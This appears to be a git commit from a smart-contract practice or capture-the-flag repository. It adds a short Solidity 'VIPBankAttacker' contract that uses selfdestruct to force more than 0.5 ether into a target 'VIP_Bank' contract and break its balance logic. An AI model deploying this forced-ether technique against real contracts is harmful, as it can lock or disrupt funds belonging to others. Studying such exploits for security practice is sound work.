7ed9246ab9cc0e7172e20eb1ae5987273a63f6a3
web3-priate <lightmorning46@gmail.com>
2023-11-28 02:54:59 -0600

    write the Attacker contract

--- contracts/vip_banks.sol
+++ contracts/vip_banks.sol
@@ -49,3 +49,12 @@ contract VIP_Bank {
         return address(this).balance;
     }
 }
+
+contract VIPBankAttacker {
+    constructor(address payable targetAddr) payable {
+        require(msg.value > 0.5 ether, "need more than 0.5 ether to attack");
+
+        // self destruct to forcefully send ether to target
+        selfdestruct(targetAddr);
+    }
+}
